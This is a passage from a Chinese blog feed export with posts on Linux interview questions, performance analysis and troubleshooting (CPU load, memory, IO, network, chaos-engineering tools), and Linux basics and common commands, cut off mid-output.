        <content type="html"><![CDATA[<h3 id="一、说下Linux基本常用的命令？"><a href="#一、说下Linux基本常用的命令？" class="headerlink" title="一、说下Linux基本常用的命令？"></a>一、说下Linux基本常用的命令？</h3><p><code>ls</code> 、<code>cat</code>、<code>tail</code>、<code>find</code>、<code>free</code>、<code>netstat</code>、<code>df -h</code></p><h3 id="二、linux系统中如何查看日志"><a href="#二、linux系统中如何查看日志" class="headerlink" title="二、linux系统中如何查看日志"></a>二、linux系统中如何查看日志</h3><p>使用tail命令，查看实时日志用-f参数，也可以使用-n指定显示多少行</p><h3 id="三、如何查询cpu使用率？"><a href="#三、如何查询cpu使用率？" class="headerlink" title="三、如何查询cpu使用率？"></a>三、如何查询cpu使用率？</h3><p>使用top命令，然后我们看<code>id</code>参数，也就是空闲CPU，用100% - id=cpu使用率</p><h3 id="四、查看cpu占用率高的进程"><a href="#四、查看cpu占用率高的进程" class="headerlink" title="四、查看cpu占用率高的进程"></a>四、查看cpu占用率高的进程</h3><p>使用ps和top命令都可以查询</p><h3 id="五、查询端口"><a href="#五、查询端口" class="headerlink" title="五、查询端口"></a>五、查询端口</h3><p>使用netstat 命令</p><h3 id="六、linux查看端口被哪个进程占用"><a href="#六、linux查看端口被哪个进程占用" class="headerlink" title="六、linux查看端口被哪个进程占用"></a>六、linux查看端口被哪个进程占用</h3><blockquote><p>lsof -i:端口号 </p><p>netstat -tunlp |grep 端口号</p></blockquote><h3 id="七、查看linux中的TCP连接数"><a href="#七、查看linux中的TCP连接数" class="headerlink" title="七、查看linux中的TCP连接数"></a>七、查看linux中的TCP连接数</h3><p>使用 netstat -nat</p><p>然后我们可以统计某端口的tcp连接数<code>netstat -nat|grep -i &quot;80&quot;|wc -l</code></p><p>注意：netstat的<code>-t</code> | <code>--tcp</code>参数就是查看tcp连接的</p><h3 id="八、查看某进程监听的端口"><a href="#八、查看某进程监听的端口" class="headerlink" title="八、查看某进程监听的端口"></a>八、查看某进程监听的端口</h3><p>ps -aux | grep tomcat</p><h3 id="九、查看系统负载"><a href="#九、查看系统负载" class="headerlink" title="九、查看系统负载"></a>九、查看系统负载</h3><p>top命令查看linux负载</p><p>load average:0.04, 0.03, 0.05：系统1分钟、5分钟、15分钟的CPU负载信息.</p><h3 id="十、grep区分小写吗？"><a href="#十、grep区分小写吗？" class="headerlink" title="十、grep区分小写吗？"></a>十、grep区分小写吗？</h3><p>默认是区分大小写的，但是我们使用<code>-i</code>参数，让它不区分大小写</p><h3 id="color-green-Linux公开学习视频推荐：-https-ke-qq-com-course-434219"><a href="#color-green-Linux公开学习视频推荐：-https-ke-qq-com-course-434219" class="headerlink" title="$\color{green}{Linux公开学习视频推荐：}$https://ke.qq.com/course/434219"></a>$\color{green}{Linux公开学习视频推荐：}$<a href="https://ke.qq.com/course/434219" target="_blank" rel="noopener">https://ke.qq.com/course/434219</a></h3><h3 id="当然也可以加群857565362一起学习共同进步"><a href="#当然也可以加群857565362一起学习共同进步" class="headerlink" title="当然也可以加群857565362一起学习共同进步"></a>当然也可以加群857565362一起学习共同进步</h3>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应用性能分析及故障排查</title>
      <link href="/2020/05/24/linux-ying-yong-xing-neng-fen-xi-ji-gu-zhang-pai-cha/"/>
      <url>/2020/05/24/linux-ying-yong-xing-neng-fen-xi-ji-gu-zhang-pai-cha/</url>
      
        <content type="html"><![CDATA[<p>本文核心内容：</p><ul><li>Linux性能分析</li><li>故障模拟和混沌工厂</li><li>故障分析和解决</li></ul><h2 id="一、Linux性能分析"><a href="#一、Linux性能分析" class="headerlink" title="一、Linux性能分析"></a>一、Linux性能分析</h2><p>上图、性能优化命令速查，图片较大，建议下载回本地</p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-9aa8608c04184eb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="性能优化命令速查"></p><h3 id="1-1-什么是Linux性能问题"><a href="#1-1-什么是Linux性能问题" class="headerlink" title="1.1 什么是Linux性能问题"></a>1.1 什么是Linux性能问题</h3><ul><li>CPU使用率过高 00%！！！</li><li>CPU负载过高</li><li>内存溢出</li><li>磁盘空间不够</li><li>网络宽带被打满</li></ul><p>是系统资源不够？还是程序写的有问题？</p><h3 id="1-2-Linux下四大性能指标"><a href="#1-2-Linux下四大性能指标" class="headerlink" title="1.2 Linux下四大性能指标"></a>1.2 Linux下四大性能指标</h3><ul><li>内存</li><li>CPU</li><li>磁盘</li><li>带宽</li></ul><h3 id="1-3-CPU性能指标"><a href="#1-3-CPU性能指标" class="headerlink" title="1.3 CPU性能指标"></a>1.3 CPU性能指标</h3><p>CPU使用率：CPU的使用率<br>平均负载：单位时间内的活跃线程数<br>用户时间：CPU在用户进程上的实际百分比<br>系统时间：CPU在内核上花费的实际百分比<br>空闲时间：系统处于在等待IO操作上的时间总和<br>等待：CPU花费在等待IO操作上的时间总和<br>Nice时间：CPU优先执行的时间百分比</p><h4 id="CPU使用率和CPU负载"><a href="#CPU使用率和CPU负载" class="headerlink" title="CPU使用率和CPU负载"></a>CPU使用率和CPU负载</h4><p>CPU使用率是单位时间内CPU繁忙情况的统计，跟平均负载并不一定完全对应<br>平均负载是单位时间内的活跃进程数（处于可运行状态和不可中断状态的进程，也就是有没有获取到时间片）</p><p><strong>这里举个形象的例子：</strong><br>比如我们去坐电梯，电梯一次只能坐10个人，假设现在电梯内有10个人那么负载就是刚好的*1，一部电梯就是一核CPU，10个人刚刚好，但是超过10个人，其他人就得等待，10个人先上去，剩下的人就得等待，这时候就涉及到了CPU的等待情况，CPU已经繁忙了，本来10个人CPU的繁忙是1，那么20人、30人，那么CPU的负载就是2倍、3倍、甚至是4倍，CPU的使用率就是，每一层有多少人下去，假设电梯里的10个人都是去同一层，那么这个使用率就是非常高的</p><p>使用<code>top</code>命令，我们可以查询到CPU的使用率，等待，平均负载的一些情况<br><img src="https://upload-images.jianshu.io/upload_images/21601015-e6cd858721dd1e69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>注意：CPU负载和CPU使用率没有直接关系！！！</strong></p><h4 id="CPU负载和使用率的关系"><a href="#CPU负载和使用率的关系" class="headerlink" title="CPU负载和使用率的关系"></a>CPU负载和使用率的关系</h4><ul><li><p>CPU密集型进程，使用大量的CPU会导致平均负载升高，此时这两者是一致的</p></li><li><p>I/O密集型进程，等待I/IO也会导致平均负载升高，但CPU使用率不一定很高</p></li><li><p>大量等待CPU的进程调度也会导致平均负载升高，此时的CPU使用率也会比较高</p></li></ul><p>所以我们可以知道，辨别一个程序是不是耗费CPU，就要看它是CPU密集型还是I/O密集型，CPU密集型就是程序执行大量的计算，这个时候CPU的使用率会非常高、而I/O密集型就是程序会读取大量的I/O，比如网络间传输大文件，或者是Mysql全表扫描的情况，这个CPU负载非常高，但是CPU使用率很低，因为这个时候一直在等待I/O。</p><p><strong>注意：CPU负载和CPU使用率没有直接关系！！！</strong></p><h4 id="CPU上下文切换"><a href="#CPU上下文切换" class="headerlink" title="CPU上下文切换"></a>CPU上下文切换</h4><ul><li><p>CPU寄存器是CPU内置的容量小，但速度极快的内存。</p></li><li><p>程序计数器用来存储CPU正在执行的指令位置，即将执行的下一条指令位置，这些都是CPU执行任务前，要依赖的环境，也叫做CPU上下文。</p></li><li><p>上下文切换，就是先把前一个任务的CPU上下文，保存起来，然后加载新任务的上下文到寄存器和计数器中，才开始运行新任务</p></li></ul><h4 id="上下文切换的次数"><a href="#上下文切换的次数" class="headerlink" title="上下文切换的次数"></a>上下文切换的次数</h4><p><strong>尽量减少CPU的上下文切换！！！</strong><br><strong>上下文切换的几类</strong>：</p><ul><li>进程上下文切换</li><li>线程上下文切换<ul><li>中断上下文切换</li></ul></li></ul><p><strong>进程上下文切换</strong><br>举例：<br>假设我们程序先执行的<code>thread1</code> —&gt; 下个时间片轮到<code>thread2</code>，那么就是<code>进程1</code> —&gt; <code>进程2</code>，这也就是进程之间的切换<br><img src="https://upload-images.jianshu.io/upload_images/21601015-98ce4fe5d214b4eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="进程上下文切换"></p><p><strong>线程上下文切换</strong><br>举例：<br><code>thread1</code> —&gt; <code>thread3</code>，这个时候进程内共享的上下文信息，不需要去加载，但是呢，需要切换每个线程栈的信息，这个时候就是线程的上下切换<br><img src="https://upload-images.jianshu.io/upload_images/21601015-98ce4fe5d214b4eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="进程上下文切换"></p><p><strong>中断上下文切换</strong><br>这里涉及到内核的中断，就是CPU暂停正在执行的程序，保存状态，也就是中断它，然后在CPU处理完后会回到断点继续执行，跟进程上下文切换一样，中断上下文切换也需要消耗CPU</p><h4 id="如何分析上下文切换"><a href="#如何分析上下文切换" class="headerlink" title="如何分析上下文切换"></a>如何分析上下文切换</h4><p><strong>执行vmstat命令，查看系统整体情况</strong><br>cs（context switch）是每秒上下文切换的次数<br>in（interrupt）是每秒中断的次数<br>r （Running or Runnable）是就绪队列的长度，也就是正在运行和等待CPU的进程数<br>b（Blocked）则是处于不可中断睡眠状态的进程数</p><blockquote><p>vmstat 5<br>注：5这个参数是指我们多长时间再去采样刷新一次信息</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/21601015-1c9aa45e81d43d64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="vmstat "></p><h4 id="CPU负载高、使用率低？"><a href="#CPU负载高、使用率低？" class="headerlink" title="CPU负载高、使用率低？"></a>CPU负载高、使用率低？</h4><p><strong>产生原因</strong><br>等待磁盘I/O完成的进程过多，导致进程队列长度过大，但是cpu运行的进程却很少，这样就体现到负载过大了，cpu使用率低</p><p><strong>常见场景</strong><br>磁盘读写请求过多导致大量IO等待<code>Mysql死锁</code>、<code>Mysql全表扫描</code></p><h4 id="什么样的指标才是合理的使用CPU"><a href="#什么样的指标才是合理的使用CPU" class="headerlink" title="什么样的指标才是合理的使用CPU"></a>什么样的指标才是合理的使用CPU</h4><p><strong>CPU使用率高、负载同时也高，是完全的CPU使用</strong><br>像我们常说的<code>高性能</code>不只是说我们的<code>qps</code>上去了，而是要我们单机的CPU使用率达到了最优，这个时候才是高性能、否则就是浪费机器，用机器堆出来的高性能。</p><p>负载最优业界两种指标：</p><ul><li><ol><li>CPU负载小于核数*0.7</li></ol></li><li><ol start="2"><li>CPU负载小于核数-1</li></ol></li></ul><h4 id="如何分析CPU"><a href="#如何分析CPU" class="headerlink" title="如何分析CPU"></a>如何分析CPU</h4><ul><li><ol><li>查看CPU核数</li></ol></li><li><ol start="2"><li>查CPU负载和CPU使用率</li></ol></li><li><ol start="3"><li>查看进程CPU使用情况</li></ol></li><li><ol start="4"><li>查看线程上下文切换情况</li></ol></li><li><ol start="5"><li>查看线程的CPU使用情况</li></ol></li></ul><p><strong>注：这里感兴趣的可以自行去了解查询资料</strong></p><h3 id="1-4-内存性能指标"><a href="#1-4-内存性能指标" class="headerlink" title="1.4 内存性能指标"></a>1.4 内存性能指标</h3><p>空闲内存<br>Swap使用率<br>缓冲和缓存<br>Slabs描述的内核使用量<br>活动和非活动内存</p><blockquote><p>free -m</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/21601015-61ab935aca776723.gif?imageMogr2/auto-orient/strip" alt="1366178220_5505.gif"></p><h4 id="理解Cached"><a href="#理解Cached" class="headerlink" title="理解Cached"></a>理解Cached</h4><p> cached通常属于available部分（该数据3.14内核之后提供，procps-ng较新版本也显示）,也就是可用内存。什么时候程序需要了，什么时候拿去用。</p><h4 id="理解Swap"><a href="#理解Swap" class="headerlink" title="理解Swap"></a>理解Swap</h4><p>简单来讲，就是用硬盘的一块空间来当做内存使用。</p><p>内存不足时，会使用Swap，把进程暂时不用的数据存储到磁盘中</p><p>Swap会导致严重的性能问题</p><h4 id="理解Cached过大是怎么回事？"><a href="#理解Cached过大是怎么回事？" class="headerlink" title="理解Cached过大是怎么回事？"></a>理解Cached过大是怎么回事？</h4><p>使用Nginx、Netty时Cached用量过大，为什么？</p><blockquote><p>这些都是高性能的网络I/O程序，并且还要记日志的，这个时候网络I/O和磁盘I/O都是需要做临时存储，做缓存的</p></blockquote><p><strong>清空cached，cached是系统为了提升I/O性能给你缓存下来的，是可以清空的！</strong><br>清空cached是不会影响系统数据的！</p><blockquote><p>echo 1 &gt; /proc/sys/vm/drop_caches</p></blockquote><h3 id="1-5-IO性能指标"><a href="#1-5-IO性能指标" class="headerlink" title="1.5 IO性能指标"></a>1.5 IO性能指标</h3><ul><li>磁盘使用率</li><li>IO饱和度</li><li>IOPS</li><li>吞吐量</li><li>响应时间</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/21601015-247adcdac6c397fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IO性能指标"></p><h4 id="顺序读写和随机读写"><a href="#顺序读写和随机读写" class="headerlink" title="顺序读写和随机读写"></a>顺序读写和随机读写</h4><p>顺序读写和随机读写，我们一般称为顺序IO、随机IO。<br><strong>顺序IO：</strong> 可以通过预读来将一部分数据提前加载到内存中<br><strong>随机IO：</strong> 需要多次寻址</p><p>举例:为什么Kafka性能高，顺序写（追加写）它是连续的</p><h4 id="标准IO、直接IO、MMAP"><a href="#标准IO、直接IO、MMAP" class="headerlink" title="标准IO、直接IO、MMAP"></a>标准IO、直接IO、MMAP</h4><p><strong>标准IO：</strong>缓存IO、系统默认IO<br><strong>直接IO：</strong>直接读取硬盘（直接IO+异步IO）<br><strong>mmap：</strong> 内存映射</p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-c318b78e81050206.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h4 id="页缓存"><a href="#页缓存" class="headerlink" title="页缓存"></a>页缓存</h4><p>持久化应该怎么做？</p><ul><li>方法一：来一行，持久化一行。</li><li>方法二：来一行，内存中记录下来，累计一批，刷盘持久化！</li></ul><p>Kafka —&gt;写入页缓存—&gt;磁盘</p><h4 id="线上磁盘最常出的问题"><a href="#线上磁盘最常出的问题" class="headerlink" title="线上磁盘最常出的问题"></a>线上磁盘最常出的问题</h4><p>磁盘可用空间不足，怎么办？<br>首页想到的是什么？清理日志！！！<br>如果清理了日志，还是不行，那么就寻址存在的大文件</p><blockquote><p>du -h –max-depth=1</p></blockquote><h4 id="什么地方容易出现IO问题？"><a href="#什么地方容易出现IO问题？" class="headerlink" title="什么地方容易出现IO问题？"></a>什么地方容易出现IO问题？</h4><ul><li>中间件</li><li>消息队列Kafka</li><li>搜索引擎ElasticSearch</li><li>数据库Mysql</li></ul><p><strong>应用</strong><br>大批量日志打印（同步打印，异步打印）</p><blockquote><p>iostat</p></blockquote><p>更多我们可以查看第一张图的速查表！！！</p><h4 id="好用的磁盘IO性能排查工具"><a href="#好用的磁盘IO性能排查工具" class="headerlink" title="好用的磁盘IO性能排查工具"></a>好用的磁盘IO性能排查工具</h4><p><strong>iostat：</strong>查看块设备维度的磁盘IO情况<br><strong>pidstat：</strong>查看进程级别的资源情况<br><strong>iotop：</strong>查看磁盘整体情况和各进程情况</p><p>先通过iostat查看整体的磁盘IO情况<br>在结合iotop和pidstat分析具体的进程情况</p><h3 id="1-6-网络性能指标"><a href="#1-6-网络性能指标" class="headerlink" title="1.6 网络性能指标"></a>1.6 网络性能指标</h3><p><strong>宽带：</strong>百兆、千兆<br><strong>吞吐量：</strong><br> <strong>延迟：</strong>网络发起 - 收到响应的耗时<br><strong>PPS：</strong>Package Per Second，每秒传输的包数<br><strong>网络可用性：</strong>网络通不通<br><strong>并发连接数：</strong><br><strong>丢包率：</strong>网络故障、发生n次，失败m次</p><h4 id="网络可用性"><a href="#网络可用性" class="headerlink" title="网络可用性"></a>网络可用性</h4><p>网络通不通，先来ping一ping<br><img src="https://upload-images.jianshu.io/upload_images/21601015-aa9d72eecec8c3b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ping"></p><p>ping不通（先排除不让ping的情况），原因排查，测试网络路由情况，断在那里？<br><code>traceroute</code>，网络路由情况，一览无遗！！！</p><h4 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h4><blockquote><p>nslookup <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><h4 id="网卡配置查看"><a href="#网卡配置查看" class="headerlink" title="网卡配置查看"></a>网卡配置查看</h4><p>要查看网络配置，通过<code>ipconfig</code> | <code>ip addr</code>查看网卡信息和网络新。</p><h2 id="二、故障模拟和混沌工厂"><a href="#二、故障模拟和混沌工厂" class="headerlink" title="二、故障模拟和混沌工厂"></a>二、故障模拟和混沌工厂</h2><h3 id="2-1-模拟故障工具"><a href="#2-1-模拟故障工具" class="headerlink" title="2.1 模拟故障工具"></a>2.1 模拟故障工具</h3><p>Sysbench：<a href="https://github.com/akopytov/sysbench" target="_blank" rel="noopener">https://github.com/akopytov/sysbench</a></p><p>模拟20个线程，压测3分钟</p><blockquote><p>sysbench –threads=20 –time=180 threads run</p></blockquote><p>然后我们通过top和vmstat查看</p><blockquote><p>top</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/21601015-c12966b5746385c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="top"></p><blockquote><p>vmstat 2</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/21601015-270d805671fd854a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="vmstat"></p><h4 id="新时代的故障注入工具——混沌工程"><a href="#新时代的故障注入工具——混沌工程" class="headerlink" title="新时代的故障注入工具——混沌工程"></a>新时代的故障注入工具——混沌工程</h4><p>混沌工程是一门新兴的技术学科，他的初衷是通过实验性的方法，让人们建立对于复杂分布式系统在生产中抵御突发事件能力的信心。          - -混沌工程原则</p><h4 id="故障演练"><a href="#故障演练" class="headerlink" title="故障演练"></a>故障演练</h4><h4 id="ChaosBlade"><a href="#ChaosBlade" class="headerlink" title="ChaosBlade"></a>ChaosBlade</h4><p>ChaosBlade 是一款遵循混沌工程实验原理，建立在阿里巴巴近十年故障测试和演练实践基础上，并结合了集团各业务的最佳创意和实践，提供丰富故障场景实现，帮助分布式系统提升容错性和可恢复性的混沌工程工具。</p><p><a href="https://github.com/chaosblade-io/chaosblade/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/chaosblade-io/chaosblade/blob/master/README_CN.md</a></p><p>参考文章：<br><a href="https://blog.csdn.net/u013256816/article/details/99917021" target="_blank" rel="noopener">https://blog.csdn.net/u013256816/article/details/99917021</a></p><p><a href="https://www.cnblogs.com/pigpdong/p/10932415.html" target="_blank" rel="noopener">https://www.cnblogs.com/pigpdong/p/10932415.html</a></p><h2 id="三、故障分析和解决"><a href="#三、故障分析和解决" class="headerlink" title="三、故障分析和解决"></a>三、故障分析和解决</h2><h3 id="3-1-分析CPU问题"><a href="#3-1-分析CPU问题" class="headerlink" title="3.1 分析CPU问题"></a>3.1 分析CPU问题</h3><p><strong>1. top命令分析上下文切换</strong><br><strong>2. vmstat分析上下文切换</strong><br><strong>3. pidstat分析上下文切换和CPU使用情况</strong><br><strong>4. 通过ps获取进程ID</strong><br><strong>5. strace跟踪进程情况</strong></p><p>这里就不截图了，文章的核心是提供思路，而这些命令相信大家都基本了解过，如果有不了解的，可以查阅一下资料</p><h3 id="3-2-优化CPU问题"><a href="#3-2-优化CPU问题" class="headerlink" title="3.2 优化CPU问题"></a>3.2 优化CPU问题</h3><p><strong>1. 程序减少不必要的工作</strong><br><strong>2. 程序减少循环层次、减少递归</strong><br><strong>3. 优化算法</strong><br><strong>4. 异步处理，防止阻塞</strong><br><strong>5. 善用缓存，防止IO等待</strong><br><strong>6. CPU绑定（nginx绑定CPU）</strong><br><strong>7. 限制CPU资源（cgroup，docker）</strong></p><h3 id="3-3-监控"><a href="#3-3-监控" class="headerlink" title="3.3 监控"></a>3.3 监控</h3><p><strong>CPU需要监控</strong><br><strong>内存需要监控</strong><br><strong>磁盘空间需要监控</strong><br>….<br>监控之后，程序还要告警，通知我们处理问题！！！</p><h3 id="color-green-Linux公开学习视频推荐：-https-ke-qq-com-course-434219"><a href="#color-green-Linux公开学习视频推荐：-https-ke-qq-com-course-434219" class="headerlink" title="$\color{green}{Linux公开学习视频推荐：}$https://ke.qq.com/course/434219"></a>$\color{green}{Linux公开学习视频推荐：}$<a href="https://ke.qq.com/course/434219" target="_blank" rel="noopener">https://ke.qq.com/course/434219</a></h3><h3 id="当然也可以加群857565362一起学习共同进步"><a href="#当然也可以加群857565362一起学习共同进步" class="headerlink" title="当然也可以加群857565362一起学习共同进步"></a>当然也可以加群857565362一起学习共同进步</h3>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 故障排查 </tag>
            
            <tag> 性能分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础和常用命令</title>
      <link href="/2020/05/24/linux-ji-chu-he-chang-yong-ming-ling/"/>
      <url>/2020/05/24/linux-ji-chu-he-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是Linux"><a href="#一、什么是Linux" class="headerlink" title="一、什么是Linux"></a>一、什么是Linux</h2><p>Linux是一种自由和开放源代码的类UNIX操作系统。</p><p>是linus在1991年10月5日首次发布。</p><p>开放的、子域的遵循GNU许可。</p><p>任何个人和机构都可以自由的使用Linux的所有底层源码</p><h2 id="二、什么是发行版"><a href="#二、什么是发行版" class="headerlink" title="二、什么是发行版"></a>二、什么是发行版</h2><p>Linux发行版=Linux内核+软件集合</p><p>来自维基百科的释义：</p><p><a href="https://zh.wikipedia.org/wiki/Linux发行版" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Linux%E5%8F%91%E8%A1%8C%E7%89%88</a></p><blockquote><p><strong>Linux 发行版</strong>（英语：Linux distribution，也被叫做<strong>GNU/Linux 发行版</strong>），为一般用户预先集成好的<a href="https://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a><a href="https://zh.wikipedia.org/wiki/作業系統" target="_blank" rel="noopener">操作系统</a>及各种应用软件。一般用户不需要重新<a href="https://zh.wikipedia.org/wiki/编译" target="_blank" rel="noopener">编译</a>，在直接安装之后，只需要小幅度更改设置就可以使用，通常以<a href="https://zh.wikipedia.org/wiki/软件包管理系统" target="_blank" rel="noopener">软件包管理系统</a>来进行应用软件的管理。Linux发行版通常包含了包括<a href="https://zh.wikipedia.org/wiki/桌面环境" target="_blank" rel="noopener">桌面环境</a>、<a href="https://zh.wikipedia.org/w/index.php?title=办公套件&action=edit&redlink=1" target="_blank" rel="noopener">办公包</a>、<a href="https://zh.wikipedia.org/wiki/媒体播放器" target="_blank" rel="noopener">媒体播放器</a>、<a href="https://zh.wikipedia.org/wiki/数据库" target="_blank" rel="noopener">数据库</a>等应用软件。这些<a href="https://zh.wikipedia.org/wiki/操作系统" target="_blank" rel="noopener">操作系统</a>通常由Linux内核、以及来自GNU计划的大量的<a href="https://zh.wikipedia.org/wiki/函式庫" target="_blank" rel="noopener">函数库</a>，和基于<a href="https://zh.wikipedia.org/wiki/X_Window" target="_blank" rel="noopener">X Window</a>的图形界面。有些发行版考虑到容量大小而没有预装 X Window，而使用更加轻量级的软件，如：<a href="https://zh.wikipedia.org/wiki/Busybox" target="_blank" rel="noopener">busybox</a>, <a href="https://zh.wikipedia.org/w/index.php?title=Uclibc&action=edit&redlink=1" target="_blank" rel="noopener">uclibc</a> 或 <a href="https://zh.wikipedia.org/wiki/Dietlibc" target="_blank" rel="noopener">dietlibc</a>。现在有超过300个Linux发行版（<a href="https://zh.wikipedia.org/wiki/Linux发行版列表" target="_blank" rel="noopener">Linux发行版列表</a>）。大部分都正处于活跃的开发中，不断地改进。</p></blockquote><p><strong>个人桌面版</strong></p><ul><li>面向个人用户。由于安装了图像界面，界面美观，操作方便，比较适合新手，但相对于服务器版来说较消耗资源</li><li>常见的桌面版有Ubuntu、Debian、Fedora、CentOS、openSUSE</li></ul><p><strong>企业服务器版</strong></p><ul><li>面向企业用户。系统稳定性好，资源消耗较小，满足企业需求，但基本都是命令行界面，需要有一定的基础才能上手操作。</li><li>常见的服务器版有RHEL、CentOS、Debian、Ubuntu、openSUSE</li></ul><p><strong>Linux发展史图</strong><br>注意右上角：Open Source（开源的）、Mixed/shared source  （半开源）、 Closed source （关源）<br><img src="https://upload-images.jianshu.io/upload_images/21601015-7a6e8abefb76c4bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Linux发展史图.png"></p><p>在这里我们还可以看到Mac OS它是基于Unix Version 8封装改造的，这也是为什么它和linux这么像，与之不同的是，Linux是基于Unix的特性自己开发的，而Mac OS它是直接使用改造的！<br><img src="https://upload-images.jianshu.io/upload_images/21601015-2fd58a0dbaed9bd3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Linux发展史图2.png"></p><p><strong>Linux内核官网</strong></p><p>在这里我们可以查询到Linux内核的最新版本</p><p><a href="https://www.kernel.org/" target="_blank" rel="noopener">https://www.kernel.org/</a><br><img src="https://upload-images.jianshu.io/upload_images/21601015-d2a8453a7889790a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Linux内核官网.png"></p><p><strong>（Windows、Linux、MacOS）三大系统的区别</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-eedf5dadc2995022.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="三大系统的区别.png"></p><h2 id="三、Linux系统核心"><a href="#三、Linux系统核心" class="headerlink" title="三、Linux系统核心"></a>三、Linux系统核心</h2><ul><li>Linux内核</li><li>Linux Shell</li><li>Linux 文件系统</li><li>Linux 应用系统</li></ul><h3 id="3-1-Linux内核是什么？"><a href="#3-1-Linux内核是什么？" class="headerlink" title="3.1 Linux内核是什么？"></a>3.1 Linux内核是什么？</h3><blockquote><p>开源的类Unix操作系统宏内核。整个Linux操作系统家族基于该内核部署在传统的计算机平台和嵌入式平台上。<br>包括现在的电脑、服务器、手机、路由器、交换机、机顶盒、智能电视等等。</p></blockquote><blockquote><p>从技术上讲：Linux是一个符合POSIX标准的内核。提供了一套应用程序接口，通过该接口用户能和内核以及硬件打交道。</p></blockquote><h4 id="关键词解释"><a href="#关键词解释" class="headerlink" title="关键词解释"></a>关键词解释</h4><p><strong>宏内核</strong>：</p><p>简单来说，就是把很多东西都集成进内核，例如linux内核，除了最基本的进程、线程管理、内存管理外，文件系统，驱动，网络协议等等都在内核里面。优点是效率高。缺点是稳定性差，开发过程中的bug经常会导致整个系统挂掉。做驱动开发的应该经常有按电源键强行关机的经历。</p><p>参考文章：宏内核与微内核、Linux内核与Unix内核的区别 </p><p><a href="https://blog.csdn.net/silencegll/article/details/51496158" target="_blank" rel="noopener">https://blog.csdn.net/silencegll/article/details/51496158</a></p><p><strong>POSIX标准</strong></p><p>POSIX表示可移植操作系统接口（Portable Operating System Interface of UNIX，缩写为 POSIX ），POSIX标准定义了操作系统应该为应用程序提供的接口标准。</p><p>POSIX标准意在期望获得源代码级别的软件可移植性。换句话说，为一个POSIX兼容的操作系统编写的程序，应该可以在任何其它的POSIX操作系统（即使是来自另一个厂商）上编译执行。</p><p>参考文章：</p><p>一、POSIX介绍</p><p><a href="https://blog.csdn.net/weixin_40039738/article/details/81867577" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40039738/article/details/81867577</a></p><p>二、POSIX API</p><p><a href="https://www.cnblogs.com/alexliu2360/p/5674345.html" target="_blank" rel="noopener">https://www.cnblogs.com/alexliu2360/p/5674345.html</a></p><p>三、知乎来源</p><p><a href="https://www.zhihu.com/question/21048638" target="_blank" rel="noopener">https://www.zhihu.com/question/21048638</a></p><p><strong>Linux内核图</strong></p><p>从图中可以看出，内核的最上层是系统的调用接口，简称（SCI），然后其下是进程管理（PM）、文件系统（VFS）、内存管理（MM）、网络堆栈，最底下是相关的硬件和驱动<br><img src="https://upload-images.jianshu.io/upload_images/21601015-78329124e0cea106.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Linux内核图.jpg"></p><p><strong>内核、操作系统</strong></p><p>单一的Linux内核不是一套完整的操作系统</p><p>内核 –&gt; 操作系统</p><p>内核 –&gt; 发行版本</p><h3 id="3-2-Linux文件系统：一切皆文件"><a href="#3-2-Linux文件系统：一切皆文件" class="headerlink" title="3.2 Linux文件系统：一切皆文件"></a>3.2 Linux文件系统：一切皆文件</h3><p><img src="https://upload-images.jianshu.io/upload_images/21601015-f9360c0f6da96816.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="文件系统.png"></p><p><strong>参考文章：</strong><a href="https://blog.51cto.com/12674559/2095216" target="_blank" rel="noopener">https://blog.51cto.com/12674559/2095216</a></p><h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="1-系统信息"><a href="#1-系统信息" class="headerlink" title="1.系统信息"></a>1.系统信息</h3><p><strong>查看系统信息</strong></p><blockquote><p>uname -a</p></blockquote><pre><code>Linux xxx.xxx.xxx.xxx.xxx.com 4.10.4-1.el7.elrepo.x86_64 #1 SMP Sat Mar 18 12:50:10 EDT 2017 x86_64 x86_64 x86_64 GNU/Linux</code></pre><blockquote><p>cat /etc/system-release</p></blockquote><pre><code>CentOS Linux release 7.3.1611 (Core)</code></pre><p><strong>查看cpu</strong></p><blockquote><p>cat /proc/cpuinfo</p></blockquote><pre><code>processor    : 0vendor_id    : GenuineIntelcpu family    : 6model        : 13model name    : QEMU Virtual CPU version (cpu64-rhel6)stepping    : 